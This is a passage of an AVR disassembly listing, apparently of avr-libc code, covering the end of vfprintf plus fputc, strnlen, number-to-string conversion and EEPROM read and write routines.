    76c8:	a9 2e       	mov	r10, r25
    76ca:	09 c0       	rjmp	.+18     	; 0x76de <vfprintf+0x31a>
    76cc:	a2 fe       	sbrs	r10, 2
    76ce:	06 c0       	rjmp	.+12     	; 0x76dc <vfprintf+0x318>
    76d0:	b3 94       	inc	r11
    76d2:	b3 94       	inc	r11
    76d4:	04 c0       	rjmp	.+8      	; 0x76de <vfprintf+0x31a>
    76d6:	8a 2d       	mov	r24, r10
    76d8:	86 78       	andi	r24, 0x86	; 134
    76da:	09 f0       	breq	.+2      	; 0x76de <vfprintf+0x31a>
    76dc:	b3 94       	inc	r11
    76de:	a3 fc       	sbrc	r10, 3
    76e0:	10 c0       	rjmp	.+32     	; 0x7702 <vfprintf+0x33e>
    76e2:	a0 fe       	sbrs	r10, 0
    76e4:	06 c0       	rjmp	.+12     	; 0x76f2 <vfprintf+0x32e>
    76e6:	b2 14       	cp	r11, r2
    76e8:	80 f4       	brcc	.+32     	; 0x770a <vfprintf+0x346>
    76ea:	28 0c       	add	r2, r8
    76ec:	92 2c       	mov	r9, r2
    76ee:	9b 18       	sub	r9, r11
    76f0:	0d c0       	rjmp	.+26     	; 0x770c <vfprintf+0x348>
    76f2:	b2 14       	cp	r11, r2
    76f4:	58 f4       	brcc	.+22     	; 0x770c <vfprintf+0x348>
    76f6:	b6 01       	movw	r22, r12
    76f8:	80 e2       	ldi	r24, 0x20	; 32
    76fa:	90 e0       	ldi	r25, 0x00	; 0
    76fc:	79 d0       	rcall	.+242    	; 0x77f0 <fputc>
    76fe:	b3 94       	inc	r11
    7700:	f8 cf       	rjmp	.-16     	; 0x76f2 <vfprintf+0x32e>
    7702:	b2 14       	cp	r11, r2
    7704:	18 f4       	brcc	.+6      	; 0x770c <vfprintf+0x348>
    7706:	2b 18       	sub	r2, r11
    7708:	02 c0       	rjmp	.+4      	; 0x770e <vfprintf+0x34a>
    770a:	98 2c       	mov	r9, r8
    770c:	21 2c       	mov	r2, r1
    770e:	a4 fe       	sbrs	r10, 4
    7710:	0f c0       	rjmp	.+30     	; 0x7730 <vfprintf+0x36c>
    7712:	b6 01       	movw	r22, r12
    7714:	80 e3       	ldi	r24, 0x30	; 48
    7716:	90 e0       	ldi	r25, 0x00	; 0
    7718:	6b d0       	rcall	.+214    	; 0x77f0 <fputc>
    771a:	a2 fe       	sbrs	r10, 2
    771c:	16 c0       	rjmp	.+44     	; 0x774a <vfprintf+0x386>
    771e:	a1 fc       	sbrc	r10, 1
    7720:	03 c0       	rjmp	.+6      	; 0x7728 <vfprintf+0x364>
    7722:	88 e7       	ldi	r24, 0x78	; 120
    7724:	90 e0       	ldi	r25, 0x00	; 0
    7726:	02 c0       	rjmp	.+4      	; 0x772c <vfprintf+0x368>
    7728:	88 e5       	ldi	r24, 0x58	; 88
    772a:	90 e0       	ldi	r25, 0x00	; 0
    772c:	b6 01       	movw	r22, r12
    772e:	0c c0       	rjmp	.+24     	; 0x7748 <vfprintf+0x384>
    7730:	8a 2d       	mov	r24, r10
    7732:	86 78       	andi	r24, 0x86	; 134
    7734:	51 f0       	breq	.+20     	; 0x774a <vfprintf+0x386>
    7736:	a1 fe       	sbrs	r10, 1
    7738:	02 c0       	rjmp	.+4      	; 0x773e <vfprintf+0x37a>
    773a:	8b e2       	ldi	r24, 0x2B	; 43
    773c:	01 c0       	rjmp	.+2      	; 0x7740 <vfprintf+0x37c>
    773e:	80 e2       	ldi	r24, 0x20	; 32
    7740:	a7 fc       	sbrc	r10, 7
    7742:	8d e2       	ldi	r24, 0x2D	; 45
    7744:	b6 01       	movw	r22, r12
    7746:	90 e0       	ldi	r25, 0x00	; 0
    7748:	53 d0       	rcall	.+166    	; 0x77f0 <fputc>
    774a:	89 14       	cp	r8, r9
    774c:	30 f4       	brcc	.+12     	; 0x775a <vfprintf+0x396>
    774e:	b6 01       	movw	r22, r12
    7750:	80 e3       	ldi	r24, 0x30	; 48
    7752:	90 e0       	ldi	r25, 0x00	; 0
    7754:	4d d0       	rcall	.+154    	; 0x77f0 <fputc>
    7756:	9a 94       	dec	r9
    7758:	f8 cf       	rjmp	.-16     	; 0x774a <vfprintf+0x386>
    775a:	8a 94       	dec	r8
    775c:	f3 01       	movw	r30, r6
    775e:	e8 0d       	add	r30, r8
    7760:	f1 1d       	adc	r31, r1
    7762:	80 81       	ld	r24, Z
    7764:	b6 01       	movw	r22, r12
    7766:	90 e0       	ldi	r25, 0x00	; 0
    7768:	43 d0       	rcall	.+134    	; 0x77f0 <fputc>
    776a:	81 10       	cpse	r8, r1
    776c:	f6 cf       	rjmp	.-20     	; 0x775a <vfprintf+0x396>
    776e:	22 20       	and	r2, r2
    7770:	09 f4       	brne	.+2      	; 0x7774 <vfprintf+0x3b0>
    7772:	4e ce       	rjmp	.-868    	; 0x7410 <vfprintf+0x4c>
    7774:	b6 01       	movw	r22, r12
    7776:	80 e2       	ldi	r24, 0x20	; 32
    7778:	90 e0       	ldi	r25, 0x00	; 0
    777a:	3a d0       	rcall	.+116    	; 0x77f0 <fputc>
    777c:	2a 94       	dec	r2
    777e:	f7 cf       	rjmp	.-18     	; 0x776e <vfprintf+0x3aa>
    7780:	f6 01       	movw	r30, r12
    7782:	86 81       	ldd	r24, Z+6	; 0x06
    7784:	97 81       	ldd	r25, Z+7	; 0x07
    7786:	02 c0       	rjmp	.+4      	; 0x778c <vfprintf+0x3c8>
    7788:	8f ef       	ldi	r24, 0xFF	; 255
    778a:	9f ef       	ldi	r25, 0xFF	; 255
    778c:	2b 96       	adiw	r28, 0x0b	; 11
    778e:	0f b6       	in	r0, 0x3f	; 63
    7790:	f8 94       	cli
    7792:	de bf       	out	0x3e, r29	; 62
    7794:	0f be       	out	0x3f, r0	; 63
    7796:	cd bf       	out	0x3d, r28	; 61
    7798:	df 91       	pop	r29
    779a:	cf 91       	pop	r28
    779c:	1f 91       	pop	r17
    779e:	0f 91       	pop	r16
    77a0:	ff 90       	pop	r15
    77a2:	ef 90       	pop	r14
    77a4:	df 90       	pop	r13
    77a6:	cf 90       	pop	r12
    77a8:	bf 90       	pop	r11
    77aa:	af 90       	pop	r10
    77ac:	9f 90       	pop	r9
    77ae:	8f 90       	pop	r8
    77b0:	7f 90       	pop	r7
    77b2:	6f 90       	pop	r6
    77b4:	5f 90       	pop	r5
    77b6:	4f 90       	pop	r4
    77b8:	3f 90       	pop	r3
    77ba:	2f 90       	pop	r2
    77bc:	08 95       	ret

000077be <__ctype_isfalse>:
    77be:	99 27       	eor	r25, r25
    77c0:	88 27       	eor	r24, r24

000077c2 <__ctype_istrue>:
    77c2:	08 95       	ret

000077c4 <strnlen_P>:
    77c4:	fc 01       	movw	r30, r24
    77c6:	05 90       	lpm	r0, Z+
    77c8:	61 50       	subi	r22, 0x01	; 1
    77ca:	70 40       	sbci	r23, 0x00	; 0
    77cc:	01 10       	cpse	r0, r1
    77ce:	d8 f7       	brcc	.-10     	; 0x77c6 <strnlen_P+0x2>
    77d0:	80 95       	com	r24
    77d2:	90 95       	com	r25
    77d4:	8e 0f       	add	r24, r30
    77d6:	9f 1f       	adc	r25, r31
    77d8:	08 95       	ret

000077da <strnlen>:
    77da:	fc 01       	movw	r30, r24
    77dc:	61 50       	subi	r22, 0x01	; 1
    77de:	70 40       	sbci	r23, 0x00	; 0
    77e0:	01 90       	ld	r0, Z+
    77e2:	01 10       	cpse	r0, r1
    77e4:	d8 f7       	brcc	.-10     	; 0x77dc <strnlen+0x2>
    77e6:	80 95       	com	r24
    77e8:	90 95       	com	r25
    77ea:	8e 0f       	add	r24, r30
    77ec:	9f 1f       	adc	r25, r31
    77ee:	08 95       	ret

000077f0 <fputc>:
    77f0:	0f 93       	push	r16
    77f2:	1f 93       	push	r17
    77f4:	cf 93       	push	r28
    77f6:	df 93       	push	r29
    77f8:	fb 01       	movw	r30, r22
    77fa:	23 81       	ldd	r18, Z+3	; 0x03
    77fc:	21 fd       	sbrc	r18, 1
    77fe:	03 c0       	rjmp	.+6      	; 0x7806 <fputc+0x16>
    7800:	8f ef       	ldi	r24, 0xFF	; 255
    7802:	9f ef       	ldi	r25, 0xFF	; 255
    7804:	2c c0       	rjmp	.+88     	; 0x785e <fputc+0x6e>
    7806:	22 ff       	sbrs	r18, 2
    7808:	16 c0       	rjmp	.+44     	; 0x7836 <fputc+0x46>
    780a:	46 81       	ldd	r20, Z+6	; 0x06
    780c:	57 81       	ldd	r21, Z+7	; 0x07
    780e:	24 81       	ldd	r18, Z+4	; 0x04
    7810:	35 81       	ldd	r19, Z+5	; 0x05
    7812:	42 17       	cp	r20, r18
    7814:	53 07       	cpc	r21, r19
    7816:	44 f4       	brge	.+16     	; 0x7828 <fputc+0x38>
    7818:	a0 81       	ld	r26, Z
    781a:	b1 81       	ldd	r27, Z+1	; 0x01
    781c:	9d 01       	movw	r18, r26
    781e:	2f 5f       	subi	r18, 0xFF	; 255
    7820:	3f 4f       	sbci	r19, 0xFF	; 255
    7822:	31 83       	std	Z+1, r19	; 0x01
    7824:	20 83       	st	Z, r18
    7826:	8c 93       	st	X, r24
    7828:	26 81       	ldd	r18, Z+6	; 0x06
    782a:	37 81       	ldd	r19, Z+7	; 0x07
    782c:	2f 5f       	subi	r18, 0xFF	; 255
    782e:	3f 4f       	sbci	r19, 0xFF	; 255
    7830:	37 83       	std	Z+7, r19	; 0x07
    7832:	26 83       	std	Z+6, r18	; 0x06
    7834:	14 c0       	rjmp	.+40     	; 0x785e <fputc+0x6e>
    7836:	8b 01       	movw	r16, r22
    7838:	ec 01       	movw	r28, r24
    783a:	fb 01       	movw	r30, r22
    783c:	00 84       	ldd	r0, Z+8	; 0x08
    783e:	f1 85       	ldd	r31, Z+9	; 0x09
    7840:	e0 2d       	mov	r30, r0
    7842:	09 95       	icall
    7844:	89 2b       	or	r24, r25
    7846:	e1 f6       	brne	.-72     	; 0x7800 <fputc+0x10>
    7848:	d8 01       	movw	r26, r16
    784a:	16 96       	adiw	r26, 0x06	; 6
    784c:	8d 91       	ld	r24, X+
    784e:	9c 91       	ld	r25, X
    7850:	17 97       	sbiw	r26, 0x07	; 7
    7852:	01 96       	adiw	r24, 0x01	; 1
    7854:	17 96       	adiw	r26, 0x07	; 7
    7856:	9c 93       	st	X, r25
    7858:	8e 93       	st	-X, r24
    785a:	16 97       	sbiw	r26, 0x06	; 6
    785c:	ce 01       	movw	r24, r28
    785e:	df 91       	pop	r29
    7860:	cf 91       	pop	r28
    7862:	1f 91       	pop	r17
    7864:	0f 91       	pop	r16
    7866:	08 95       	ret

00007868 <__ultoa_invert>:
    7868:	fa 01       	movw	r30, r20
    786a:	aa 27       	eor	r26, r26
    786c:	28 30       	cpi	r18, 0x08	; 8
    786e:	51 f1       	breq	.+84     	; 0x78c4 <__ultoa_invert+0x5c>
    7870:	20 31       	cpi	r18, 0x10	; 16
    7872:	81 f1       	breq	.+96     	; 0x78d4 <__ultoa_invert+0x6c>
    7874:	e8 94       	clt
    7876:	6f 93       	push	r22
    7878:	6e 7f       	andi	r22, 0xFE	; 254
    787a:	6e 5f       	subi	r22, 0xFE	; 254
    787c:	7f 4f       	sbci	r23, 0xFF	; 255
    787e:	8f 4f       	sbci	r24, 0xFF	; 255
    7880:	9f 4f       	sbci	r25, 0xFF	; 255
    7882:	af 4f       	sbci	r26, 0xFF	; 255
    7884:	b1 e0       	ldi	r27, 0x01	; 1
    7886:	3e d0       	rcall	.+124    	; 0x7904 <__ultoa_invert+0x9c>
    7888:	b4 e0       	ldi	r27, 0x04	; 4
    788a:	3c d0       	rcall	.+120    	; 0x7904 <__ultoa_invert+0x9c>
    788c:	67 0f       	add	r22, r23
    788e:	78 1f       	adc	r23, r24
    7890:	89 1f       	adc	r24, r25
    7892:	9a 1f       	adc	r25, r26
    7894:	a1 1d       	adc	r26, r1
    7896:	68 0f       	add	r22, r24
    7898:	79 1f       	adc	r23, r25
    789a:	8a 1f       	adc	r24, r26
    789c:	91 1d       	adc	r25, r1
    789e:	a1 1d       	adc	r26, r1
    78a0:	6a 0f       	add	r22, r26
    78a2:	71 1d       	adc	r23, r1
    78a4:	81 1d       	adc	r24, r1
    78a6:	91 1d       	adc	r25, r1
    78a8:	a1 1d       	adc	r26, r1
    78aa:	20 d0       	rcall	.+64     	; 0x78ec <__ultoa_invert+0x84>
    78ac:	09 f4       	brne	.+2      	; 0x78b0 <__ultoa_invert+0x48>
    78ae:	68 94       	set
    78b0:	3f 91       	pop	r19
    78b2:	2a e0       	ldi	r18, 0x0A	; 10
    78b4:	26 9f       	mul	r18, r22
    78b6:	11 24       	eor	r1, r1
    78b8:	30 19       	sub	r19, r0
    78ba:	30 5d       	subi	r19, 0xD0	; 208
    78bc:	31 93       	st	Z+, r19
    78be:	de f6       	brtc	.-74     	; 0x7876 <__ultoa_invert+0xe>
    78c0:	cf 01       	movw	r24, r30
    78c2:	08 95       	ret
    78c4:	46 2f       	mov	r20, r22
    78c6:	47 70       	andi	r20, 0x07	; 7
    78c8:	40 5d       	subi	r20, 0xD0	; 208
    78ca:	41 93       	st	Z+, r20
    78cc:	b3 e0       	ldi	r27, 0x03	; 3
    78ce:	0f d0       	rcall	.+30     	; 0x78ee <__ultoa_invert+0x86>
    78d0:	c9 f7       	brne	.-14     	; 0x78c4 <__ultoa_invert+0x5c>
    78d2:	f6 cf       	rjmp	.-20     	; 0x78c0 <__ultoa_invert+0x58>
    78d4:	46 2f       	mov	r20, r22
    78d6:	4f 70       	andi	r20, 0x0F	; 15
    78d8:	40 5d       	subi	r20, 0xD0	; 208
    78da:	4a 33       	cpi	r20, 0x3A	; 58
    78dc:	18 f0       	brcs	.+6      	; 0x78e4 <__ultoa_invert+0x7c>
    78de:	49 5d       	subi	r20, 0xD9	; 217
    78e0:	31 fd       	sbrc	r19, 1
    78e2:	40 52       	subi	r20, 0x20	; 32
    78e4:	41 93       	st	Z+, r20
    78e6:	02 d0       	rcall	.+4      	; 0x78ec <__ultoa_invert+0x84>
    78e8:	a9 f7       	brne	.-22     	; 0x78d4 <__ultoa_invert+0x6c>
    78ea:	ea cf       	rjmp	.-44     	; 0x78c0 <__ultoa_invert+0x58>
    78ec:	b4 e0       	ldi	r27, 0x04	; 4
    78ee:	a6 95       	lsr	r26
    78f0:	97 95       	ror	r25
    78f2:	87 95       	ror	r24
    78f4:	77 95       	ror	r23
    78f6:	67 95       	ror	r22
    78f8:	ba 95       	dec	r27
    78fa:	c9 f7       	brne	.-14     	; 0x78ee <__ultoa_invert+0x86>
    78fc:	00 97       	sbiw	r24, 0x00	; 0
    78fe:	61 05       	cpc	r22, r1
    7900:	71 05       	cpc	r23, r1
    7902:	08 95       	ret
    7904:	9b 01       	movw	r18, r22
    7906:	ac 01       	movw	r20, r24
    7908:	0a 2e       	mov	r0, r26
    790a:	06 94       	lsr	r0
    790c:	57 95       	ror	r21
    790e:	47 95       	ror	r20
    7910:	37 95       	ror	r19
    7912:	27 95       	ror	r18
    7914:	ba 95       	dec	r27
    7916:	c9 f7       	brne	.-14     	; 0x790a <__ultoa_invert+0xa2>
    7918:	62 0f       	add	r22, r18
    791a:	73 1f       	adc	r23, r19
    791c:	84 1f       	adc	r24, r20
    791e:	95 1f       	adc	r25, r21
    7920:	a0 1d       	adc	r26, r0
    7922:	08 95       	ret

00007924 <eeprom_read_block>:
    7924:	dc 01       	movw	r26, r24
    7926:	cb 01       	movw	r24, r22

00007928 <eeprom_read_blraw>:
    7928:	fc 01       	movw	r30, r24
    792a:	f9 99       	sbic	0x1f, 1	; 31
    792c:	fe cf       	rjmp	.-4      	; 0x792a <eeprom_read_blraw+0x2>
    792e:	06 c0       	rjmp	.+12     	; 0x793c <eeprom_read_blraw+0x14>
    7930:	f2 bd       	out	0x22, r31	; 34
    7932:	e1 bd       	out	0x21, r30	; 33
    7934:	f8 9a       	sbi	0x1f, 0	; 31
    7936:	31 96       	adiw	r30, 0x01	; 1
    7938:	00 b4       	in	r0, 0x20	; 32
    793a:	0d 92       	st	X+, r0
    793c:	41 50       	subi	r20, 0x01	; 1
    793e:	50 40       	sbci	r21, 0x00	; 0
    7940:	b8 f7       	brcc	.-18     	; 0x7930 <eeprom_read_blraw+0x8>
    7942:	08 95       	ret

00007944 <eeprom_read_byte>:
    7944:	f9 99       	sbic	0x1f, 1	; 31
    7946:	fe cf       	rjmp	.-4      	; 0x7944 <eeprom_read_byte>
    7948:	92 bd       	out	0x22, r25	; 34
    794a:	81 bd       	out	0x21, r24	; 33
    794c:	f8 9a       	sbi	0x1f, 0	; 31
    794e:	99 27       	eor	r25, r25
    7950:	80 b5       	in	r24, 0x20	; 32
    7952:	08 95       	ret

00007954 <eeprom_write_block>:
    7954:	dc 01       	movw	r26, r24
    7956:	cb 01       	movw	r24, r22
    7958:	02 c0       	rjmp	.+4      	; 0x795e <eeprom_write_block+0xa>
    795a:	2d 91       	ld	r18, X+
    795c:	05 d0       	rcall	.+10     	; 0x7968 <eeprom_write_r18>
    795e:	41 50       	subi	r20, 0x01	; 1
    7960:	50 40       	sbci	r21, 0x00	; 0
    7962:	d8 f7       	brcc	.-10     	; 0x795a <eeprom_write_block+0x6>
    7964:	08 95       	ret

00007966 <eeprom_write_byte>:
    7966:	26 2f       	mov	r18, r22

00007968 <eeprom_write_r18>:
    7968:	f9 99       	sbic	0x1f, 1	; 31
    796a:	fe cf       	rjmp	.-4      	; 0x7968 <eeprom_write_r18>
    796c:	1f ba       	out	0x1f, r1	; 31
    796e:	92 bd       	out	0x22, r25	; 34
    7970:	81 bd       	out	0x21, r24	; 33
    7972:	20 bd       	out	0x20, r18	; 32
    7974:	0f b6       	in	r0, 0x3f	; 63
    7976:	f8 94       	cli
    7978:	fa 9a       	sbi	0x1f, 2	; 31
    797a:	f9 9a       	sbi	0x1f, 1	; 31
    797c:	0f be       	out	0x3f, r0	; 63
    797e:	01 96       	adiw	r24, 0x01	; 1
    7980:	08 95       	ret

00007982 <_exit>:
    7982:	f8 94       	cli

00007984 <__stop_program>:
    7984:	ff cf       	rjmp	.-2      	; 0x7984 <__stop_program>
